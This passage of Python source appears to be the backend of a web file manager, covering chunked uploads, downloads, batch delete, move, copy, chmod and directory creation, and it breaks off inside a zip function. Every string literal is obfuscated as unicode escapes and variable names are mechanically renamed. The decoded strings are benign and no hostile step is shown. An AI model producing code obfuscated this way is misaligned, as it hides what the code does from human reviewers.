                raise HTTPException(400, codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u006e\\u0061\\u006d\\u0065\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u0020\\u0066\\u006f\\u0072\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
            O0_var_269 = O0_var_269 / filename
        O0_var_269 = self._safe_path(str(O0_var_269))
        if len(file_content) > self.max_upload and chunk_id is None:
            raise HTTPException(413, codecs.decode('\\u0046\\u0069\\u006c\\u0065\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065\\u003a\\u0020\\u0075\\u0073\\u0065\\u0020\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
        try:
            O0_var_269.parent.mkdir(parents=True, exist_ok=True)
            if chunk_id is not None and total_chunks is not None:
                O0_var_270 = hashlib.md5(O0_var_269.as_posix().encode()).hexdigest()
                self.chunk_dir.mkdir(parents=True, exist_ok=True)
                O0_var_271 = self.chunk_dir / (str(O0_var_270) + codecs.decode('\\u002e\\u0063\\u0068\\u0075\\u006e\\u006b\\u002e', 'unicode_escape') + str(chunk_id))
                with open(O0_var_271, codecs.decode('\\u0077\\u0062', 'unicode_escape')) as O0_var_272:
                    O0_var_272.write(file_content)
                O0_var_273 = list(self.chunk_dir.glob(str(O0_var_270) + codecs.decode('\\u002e\\u0063\\u0068\\u0075\\u006e\\u006b\\u002e\\u002a', 'unicode_escape')))
                if len(O0_var_273) == total_chunks:
                    O0_var_274 = self.chunk_dir / (str(O0_var_270) + codecs.decode('\\u002e\\u006c\\u006f\\u0063\\u006b', 'unicode_escape'))
                    try:
                        with open(O0_var_274, codecs.decode('\\u0078', 'unicode_escape')):
                            pass
                    except FileExistsError:
                        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): len(O0_var_273), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): total_chunks, codecs.decode('\\u006d\\u0073\\u0067', 'unicode_escape'): codecs.decode('\\u006d\\u0065\\u0072\\u0067\\u0069\\u006e\\u0067\\u0020\\u0069\\u006e\\u0020\\u0070\\u0072\\u006f\\u0067\\u0072\\u0065\\u0073\\u0073', 'unicode_escape')}
                    try:
                        with open(O0_var_269, codecs.decode('\\u0077\\u0062', 'unicode_escape')) as O0_var_275:
                            for O0_var_276 in range(total_chunks):
                                O0_var_277 = self.chunk_dir / (str(O0_var_270) + codecs.decode('\\u002e\\u0063\\u0068\\u0075\\u006e\\u006b\\u002e', 'unicode_escape') + str(O0_var_276))
                                with open(O0_var_277, codecs.decode('\\u0072\\u0062', 'unicode_escape')) as O0_var_278:
                                    O0_var_275.write(O0_var_278.read())
                                O0_var_277.unlink()
                        self._audit(codecs.decode('\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u005f\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'), str(O0_var_269), codecs.decode('\\u006d\\u0065\\u0072\\u0067\\u0065\\u0064', 'unicode_escape'), {codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0073', 'unicode_escape'): total_chunks, codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_269.stat().st_size})
                        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_269.relative_to(self.O0_fn_60)), codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'): True}
                    finally:
                        if O0_var_274.exists():
                            O0_var_274.unlink()
                else:
                    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): len(O0_var_273), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): total_chunks}
            else:
                with open(O0_var_269, codecs.decode('\\u0077\\u0062', 'unicode_escape')) as O0_var_272:
                    O0_var_272.write(file_content)
                self._audit(codecs.decode('\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'), str(O0_var_269), codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): len(file_content)})
                return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_269.relative_to(self.O0_fn_60))}
        except PermissionError:
            raise HTTPException(403, codecs.decode('\\u0050\\u0065\\u0072\\u006d\\u0069\\u0073\\u0073\\u0069\\u006f\\u006e\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064', 'unicode_escape'))
        except Exception as e:
            raise HTTPException(500, codecs.decode('\\u0055\\u0070\\u006c\\u006f\\u0061\\u0064\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))

    def download_file(self, file_path: str) -> tuple:
        O0_var_279 = self._safe_path(file_path)
        if not O0_var_279.exists():
            raise HTTPException(404, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u003a\\u0020', 'unicode_escape') + str(file_path))
        if not O0_var_279.is_file():
            raise HTTPException(400, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0066\\u0069\\u006c\\u0065\\u003a\\u0020', 'unicode_escape') + str(file_path))
        O0_var_280, O0_var_281 = mimetypes.guess_type(str(O0_var_279))
        self._audit(codecs.decode('\\u0064\\u006f\\u0077\\u006e\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'), str(O0_var_279), codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_279.stat().st_size})
        return (O0_var_279, O0_var_280 or codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006f\\u0063\\u0074\\u0065\\u0074\\u002d\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape'), O0_var_279.stat().st_size)

    def delete_paths(self, O0_var_282: List[str]) -> dict:
        O0_var_283 = []
        for O0_var_284 in O0_var_282:
            try:
                O0_var_285 = self._safe_path(O0_var_284)
                if not O0_var_285.exists():
                    O0_var_283.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_284, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006e\\u006f\\u0074\\u005f\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                try:
                    self._delete_target(O0_var_285)
                except (PermissionError, OSError):
                    time.sleep(0.3)
                    self._delete_target(O0_var_285)
                O0_var_283.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_284, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape')})
                self._audit(codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065', 'unicode_escape'), O0_var_284, codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            except HTTPException as e:
                O0_var_283.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_284, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except Exception as e:
                O0_var_283.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_284, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_283}

    @staticmethod
    def _delete_target(target):
        if target.is_dir():
            shutil.rmtree(target)
        else:
            target.unlink()

    def move_paths(self, O0_var_286: Dict[str, str]) -> dict:
        O0_var_287 = []
        for O0_var_288, O0_var_289 in O0_var_286.items():
            try:
                O0_var_290 = self._safe_path(O0_var_288)
                O0_var_291 = self._safe_path(O0_var_289)
                if not O0_var_290.exists():
                    O0_var_287.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_288, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_289, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u0020\\u006e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                if O0_var_291.exists():
                    O0_var_287.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_288, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_289, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0044\\u0065\\u0073\\u0074\\u0069\\u006e\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073', 'unicode_escape')})
                    continue
                O0_var_291.parent.mkdir(parents=True, exist_ok=True)
                shutil.move(str(O0_var_290), str(O0_var_291))
                O0_var_287.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): str(O0_var_290.relative_to(self.O0_fn_60)), codecs.decode('\\u0074\\u006f', 'unicode_escape'): str(O0_var_291.relative_to(self.O0_fn_60)), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
                self._audit(codecs.decode('\\u006d\\u006f\\u0076\\u0065\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(O0_var_288) + codecs.decode('\\u0020\\u002d\\u003e\\u0020', 'unicode_escape') + str(O0_var_289), codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            except HTTPException as e:
                O0_var_287.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_288, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_289, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except Exception as e:
                O0_var_287.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_288, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_289, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        O0_var_292 = sum((1 for O0_var_293 in O0_var_287 if O0_var_293[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == codecs.decode('\\u006f\\u006b', 'unicode_escape')))
        self._audit(codecs.decode('\\u006d\\u006f\\u0076\\u0065\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(list(O0_var_286.keys())), codecs.decode('\\u0063\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'), {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_286), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_292})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape') if O0_var_292 > 0 else codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_286), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_292, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_287}

    def copy_paths(self, O0_var_294: Dict[str, str]) -> dict:
        O0_var_295 = []
        for O0_var_296, O0_var_297 in O0_var_294.items():
            try:
                O0_var_298 = self._safe_path(O0_var_296)
                O0_var_299 = self._safe_path(O0_var_297)
                if not O0_var_298.exists():
                    O0_var_295.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_296, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_297, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u0020\\u006e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                if O0_var_299.is_dir():
                    O0_var_299 = O0_var_299 / O0_var_298.name
                if O0_var_299.exists():
                    O0_var_295.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_296, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_297, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0044\\u0065\\u0073\\u0074\\u0069\\u006e\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073', 'unicode_escape')})
                    continue
                O0_var_299.parent.mkdir(parents=True, exist_ok=True)
                if O0_var_298.is_file():
                    shutil.copy2(str(O0_var_298), str(O0_var_299))
                else:
                    shutil.copytree(str(O0_var_298), str(O0_var_299))
                O0_var_295.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): str(O0_var_298.relative_to(self.O0_fn_60)), codecs.decode('\\u0074\\u006f', 'unicode_escape'): str(O0_var_299.relative_to(self.O0_fn_60)), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
                self._audit(codecs.decode('\\u0063\\u006f\\u0070\\u0079\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(O0_var_296) + codecs.decode('\\u0020\\u002d\\u003e\\u0020', 'unicode_escape') + str(O0_var_297), codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            except HTTPException as e:
                O0_var_295.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_296, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_297, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except Exception as e:
                O0_var_295.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_296, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_297, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        O0_var_300 = sum((1 for O0_var_301 in O0_var_295 if O0_var_301[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == codecs.decode('\\u006f\\u006b', 'unicode_escape')))
        self._audit(codecs.decode('\\u0063\\u006f\\u0070\\u0079\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(list(O0_var_294.keys())), codecs.decode('\\u0063\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'), {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_294), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_300})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape') if O0_var_300 > 0 else codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_294), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_300, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_295}

    def _parse_mode(self, O0_var_302: str) -> int:
        O0_var_302 = O0_var_302.strip()
        if O0_var_302.isdigit() or (O0_var_302.startswith(codecs.decode('\\u0030', 'unicode_escape')) and O0_var_302[1:].isdigit()):
            return int(O0_var_302, 8)
        if len(O0_var_302) == 9 and all((O0_var_303 in codecs.decode('\\u0072\\u0077\\u0078\\u0053\\u0074\\u0054\\u002d', 'unicode_escape') for O0_var_303 in O0_var_302)):
            O0_var_304 = 0
            O0_var_305 = {codecs.decode('\\u0072', 'unicode_escape'): 4, codecs.decode('\\u0077', 'unicode_escape'): 2, codecs.decode('\\u0078', 'unicode_escape'): 1, codecs.decode('\\u0053', 'unicode_escape'): 0, codecs.decode('\\u0073', 'unicode_escape'): 1, codecs.decode('\\u0054', 'unicode_escape'): 0, codecs.decode('\\u0074', 'unicode_escape'): 1, codecs.decode('\\u002d', 'unicode_escape'): 0}
            for O0_var_306, O0_var_307 in enumerate(O0_var_302):
                if O0_var_307 in O0_var_305:
                    O0_var_308 = 2 - O0_var_306 % 3
                    O0_var_304 |= O0_var_305[O0_var_307] << 6 - O0_var_306 // 3 * 3 + O0_var_308
            return O0_var_304
        if any((O0_var_309 in O0_var_302 for O0_var_309 in [codecs.decode('\\u003d', 'unicode_escape'), codecs.decode('\\u002b', 'unicode_escape'), codecs.decode('\\u002d', 'unicode_escape')])) and any((O0_var_310 in O0_var_302 for O0_var_310 in [codecs.decode('\\u0075', 'unicode_escape'), codecs.decode('\\u0067', 'unicode_escape'), codecs.decode('\\u006f', 'unicode_escape'), codecs.decode('\\u0061', 'unicode_escape')])):
            raise ValueError(codecs.decode('\\u0053\\u0079\\u006d\\u0062\\u006f\\u006c\\u0069\\u0063\\u0020\\u006d\\u006f\\u0064\\u0065\\u0020\\u0027', 'unicode_escape') + str(O0_var_302) + codecs.decode('\\u0027\\u0020\\u006e\\u006f\\u0074\\u0020\\u0066\\u0075\\u006c\\u006c\\u0079\\u0020\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064\\u0020\\u0079\\u0065\\u0074\\u002c\\u0020\\u0075\\u0073\\u0065\\u0020\\u006f\\u0063\\u0074\\u0061\\u006c\\u0020\\u006c\\u0069\\u006b\\u0065\\u0020\\u0027\\u0037\\u0035\\u0035\\u0027', 'unicode_escape'))
        raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u006d\\u006f\\u0064\\u0065\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u003a\\u0020\\u0027', 'unicode_escape') + str(O0_var_302) + codecs.decode('\\u0027\\u002e\\u0020\\u0055\\u0073\\u0065\\u0020\\u0027\\u0037\\u0035\\u0035\\u0027\\u002c\\u0020\\u0027\\u0030\\u0036\\u0034\\u0034\\u0027\\u002c\\u0020\\u006f\\u0072\\u0020\\u0027\\u0072\\u0077\\u0078\\u0072\\u002d\\u0078\\u0072\\u002d\\u0078\\u0027', 'unicode_escape'))

    def set_authority(self, O0_var_311: Dict[str, str], recursive: bool=False) -> dict:
        O0_var_312 = []
        for O0_var_313, O0_var_314 in O0_var_311.items():
            try:
                O0_var_315 = self._safe_path(O0_var_313)
                if not O0_var_315.exists():
                    O0_var_312.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_313, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                O0_var_316 = self._parse_mode(O0_var_314)
                if recursive and O0_var_315.is_dir():
                    for O0_var_317, O0_var_318, O0_var_319 in os.walk(O0_var_315):
                        os.chmod(O0_var_317, O0_var_316)
                        for O0_var_320 in O0_var_318:
                            os.chmod(os.path.join(O0_var_317, O0_var_320), O0_var_316)
                        for O0_var_321 in O0_var_319:
                            os.chmod(os.path.join(O0_var_317, O0_var_321), O0_var_316)
                else:
                    os.chmod(O0_var_315, O0_var_316)
                O0_var_322 = stat.filemode(O0_var_315.stat().st_mode)
                O0_var_312.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_315.relative_to(self.O0_fn_60)), codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_314, codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0065\\u0064', 'unicode_escape'): O0_var_322, codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape'): oct(stat.S_IMODE(O0_var_315.stat().st_mode)), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
                self._audit(codecs.decode('\\u0063\\u0068\\u006d\\u006f\\u0064', 'unicode_escape'), O0_var_313, codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_314, codecs.decode('\\u0072\\u0065\\u0063\\u0075\\u0072\\u0073\\u0069\\u0076\\u0065', 'unicode_escape'): recursive})
            except HTTPException as e:
                O0_var_312.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_313, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except ValueError as e:
                O0_var_312.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_313, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
            except PermissionError:
                O0_var_312.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_313, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0050\\u0065\\u0072\\u006d\\u0069\\u0073\\u0073\\u0069\\u006f\\u006e\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064', 'unicode_escape')})
            except Exception as e:
                O0_var_312.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_313, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(type(e).__name__) + codecs.decode('\\u003a\\u0020', 'unicode_escape') + str(e)})
        O0_var_323 = sum((1 for O0_var_324 in O0_var_312 if O0_var_324[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == codecs.decode('\\u006f\\u006b', 'unicode_escape')))
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape') if O0_var_323 > 0 else codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_311), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_323, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_312}

    def create_directory(self, O0_var_325: str) -> dict:
        O0_var_326 = self._safe_path(O0_var_325)
        if O0_var_326.exists():
            raise HTTPException(409, codecs.decode('\\u0045\\u0078\\u0069\\u0073\\u0074\\u0073\\u003a\\u0020', 'unicode_escape') + str(O0_var_325))
        try:
            O0_var_326.mkdir(parents=True)
            self._audit(codecs.decode('\\u006d\\u006b\\u0064\\u0069\\u0072', 'unicode_escape'), str(O0_var_326), codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_326.relative_to(self.O0_fn_60))}
        except Exception as e:
            raise HTTPException(500, codecs.decode('\\u004d\\u006b\\u0064\\u0069\\u0072\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))
    ZIP_MAX_ENTRIES = 20000
    ZIP_MAX_TOTAL_BYTES = 512 * 1024 * 1024
    ZIP_MAX_LISTED_FILES = 500

    def _display_path(self, path: Path) -> str:
        O0_var_327 = path.relative_to(self.O0_fn_60)
        O0_var_328 = str(O0_var_327)
        return O0_var_328 if O0_var_328 else codecs.decode('\\u002e', 'unicode_escape')

    def zip_items(self, O0_var_329: str, O0_var_330: List[str], flat: bool=False) -> dict:
        O0_var_331 = self._safe_path(O0_var_329)
        if O0_var_331.exists() and O0_var_331.is_dir():
            raise HTTPException(400, codecs.decode('\\u0054\\u0061\\u0072\\u0067\\u0065\\u0074\\u0020\\u0069\\u0073\\u0020\\u0061\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079\\u003a\\u0020', 'unicode_escape') + str(O0_var_329))
        if not O0_var_330:
            raise HTTPException(400, codecs.decode('\\u0069\\u0074\\u0065\\u006d\\u0073\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u0020\\u0028\\u006e\\u006f\\u006e\\u002d\\u0065\\u006d\\u0070\\u0074\\u0079\\u0020\\u0061\\u0072\\u0072\\u0061\\u0079\\u0029', 'unicode_escape'))
        O0_var_332 = []
        O0_var_333 = 0
        O0_var_334 = False
        try:
